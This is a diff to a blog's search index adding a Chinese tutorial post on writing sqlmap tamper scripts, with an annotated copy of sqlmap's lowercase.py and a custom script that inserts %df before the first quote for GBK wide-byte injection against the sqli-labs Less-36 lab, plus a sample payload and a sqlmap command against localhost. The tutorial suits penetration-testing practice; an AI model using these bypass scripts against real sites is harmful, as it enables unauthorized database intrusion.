@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[sqlmap --tamper脚本编写]]></title>
+    <url>%2F2018%2F10%2F01%2Fsqlmap-tamper%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%2F</url>
+    <content type="text"><![CDATA[工欲善其事,必先利其器 0x01 tamper脚本在没有WAF的情况下使用Sqlmap注入网站基本上是无往不利，但是WAF的存在使得注入变得艰难，而tamper脚本可以在大多数情况下完成自动化注入 0x02 tamper脚本分析本文仅选择lowercase.py进行分析 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""import refrom lib.core.data import kb #导入sqlmap中lib\core\data中的kb函数，测试 SQL 注入的过程中，使用的配置文件事先全部被加载到了 conf 和 kbfrom lib.core.enums import PRIORITY#导入sqlmap中lib\core\enums中的PRIORITY函数， LOWEST = -100，LOWER = -50，. 详细见enums.py__priority__ = PRIORITY.NORMAL#定义优先级为一般def dependencies(): passdef tamper(payload, **kwargs):#定义tamper脚本，payload, **kwargs 为定义的参数，其中**kwargs为字典存储，类似于 &#123;'a': 1, 'c': 3, 'b': 2&#125; """ Replaces each keyword character with lower case value Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0 Notes: * Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions &gt;&gt;&gt; tamper('INSERT') 'insert' """ retVal = payload if payload: for match in re.finditer(r"\b[A-Za-z_]+\b", retVal): word = match.group()#循环遍历每个单词 if word.upper() in kb.keywords:#如果是SQL中的关键词则替换为小写 retVal = retVal.replace(word, word.lower()) return retVal#返回替换后的payload 0x03 编写tamper脚本sqli-labs第36关 Bypass MYSQL_real_escape_string,绕过mysql_real_escape_string的方法本文不再累述,编写一个tamper脚本，使得payload中第一个单引号前加上%df 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/env python#coding:utf-8"""Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""from lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies(): passdef tamper(payload, **kwargs): """ Tested against: * MySQL * gbk,mysql_real_escape_string &gt;&gt;&gt; tamper('1' and sleep(10) ') '1%df' and sleep(10)' """ retVal = "" if payload: first = False for i in payload: if i == '\'' and not first: retVal += '%df\'' first = True else: retVal += i return retVal 0x04 使用tamper脚本测试下脚本是否给力 1python2 .\sqlmap.py -u "http://localhost/sqli-labs/Less-36/?id=1" --tamper=gbk.py --dbs]]></content>
+      <tags>
+        <tag>sqlmap</tag>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Hello World]]></title>
     <url>%2F2018%2F09%2F27%2Fhello-world%2F</url>
     <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
